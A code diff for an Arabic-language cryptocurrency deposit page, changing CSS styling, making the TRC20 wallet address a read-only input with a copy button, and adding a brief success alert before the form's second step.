@@ -105,20 +105,18 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 .crypto-address-container { 
     font-family:'Changa',sans-serif !important; 
     width: 100%; 
-    padding: 12px 2px; 
+    padding: 10px; 
     text-align: center; 
     background: #181a20; 
     color: #ffffff; 
     border: 1px solid #474d57; 
     border-radius: 6px; 
-    font-size: 11.5px; 
+    font-size: 13px; 
     font-weight: 800; 
     direction: ltr; 
-    white-space: nowrap; 
-    overflow: visible; 
     box-sizing: border-box; 
     margin-top: 5px; 
-    letter-spacing: -0.2px;
+    letter-spacing: 0.2px;
 }
 
 .check-account-btn { font-family:'Changa',sans-serif !important; width:100%; padding:12px; background:transparent; color:#848e9c; border:1px dashed #474d57; border-radius:8px; font-weight:600; font-size:14px; margin-top:15px; margin-bottom:5px; cursor:pointer; transition:0.3s; box-sizing:border-box; display:block; }
@@ -132,20 +130,20 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
     display: none;
     position: fixed;
     top: 0; left: 0; width: 100%; height: 100%;
-    background-color: rgba(0, 0, 0, 0.85);
+    background-color: rgba(0, 0, 0, 0.8);
     z-index: 9999;
     align-items: center;
     justify-content: center;
 }
 .custom-alert-box {
     background-color: #1e2329;
-    border: 2px solid #02c076;
+    border: 1px solid #2b3139;
     padding: 30px;
     border-radius: 16px;
-    width: 90%;
-    max-width: 320px;
+    width: 85%;
+    max-width: 300px;
     text-align: center;
-    box-shadow: 0 0 20px rgba(2, 192, 118, 0.3);
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
 }
 
 @keyframes checkSuccessScale {
@@ -161,15 +159,15 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
     display: flex;
     align-items: center;
     justify-content: center;
-    margin: 0 auto 20px auto;
+    margin: 0 auto 15px auto;
     color: #02c076;
     font-size: 32px;
     font-weight: bold;
-    animation: checkSuccessScale 0.5s ease-out forwards;
+    animation: checkSuccessScale 0.4s ease-out forwards;
 }
 .success-text {
     font-family: 'Changa', sans-serif !important;
-    font-size: 18px;
+    font-size: 16px;
     font-weight: 700;
     color: #02c076;
     margin: 0;
@@ -224,7 +222,7 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 
 <div class="manual-deposit-box">
 <p style="font-size: 14px; margin-bottom: 10px; color: #ffffff; font-weight: 700; direction: ltr; text-align: center;">أو للإيداع من باقي المحافظ الرقمية (شبكة TRC20):</p>
-<div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
+<input type="text" id="cryptoAddress" class="crypto-address-container" value="THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP" readonly onclick="this.select()">
 <button type="button" onclick="copyCryptoAddress()" class="copy-btn-style">نسخ العنوان المعروض</button>
 </div>
 </div>
@@ -239,8 +237,15 @@ function goToStep2() {
         alert("يرجى ملء الحقول المطلوبة أولاً");
         return;
     }
-    document.getElementById("step1").style.display = "none";
-    document.getElementById("step2").style.display = "block";
+    
+    var alertBox = document.getElementById("successAlert");
+    alertBox.style.display = "flex";
+    
+    setTimeout(function() {
+        alertBox.style.display = "none";
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+    }, 2000);
 }
 
 function alertNoAccount() {
@@ -248,12 +253,16 @@ function alertNoAccount() {
 }
 
 function copyCryptoAddress() {
-    var text = document.getElementById("cryptoAddress").innerText;
-    navigator.clipboard.writeText(text).then(function() {
+    var copyText = document.getElementById("cryptoAddress");
+    copyText.select();
+    copyText.setSelectionRange(0, 99999);
+    
+    try {
+        document.execCommand("copy");
         alert("تم نسخ العنوان بنجاح!");
-    }, function() {
-        alert("فشل النسخ التلقائي، يرجى النسخ يدوياً.");
-    });
+    } catch (err) {
+        alert("يرجى الضغط مطولاً على النص ونسخه يدوياً.");
+    }
 }
 </script>
 
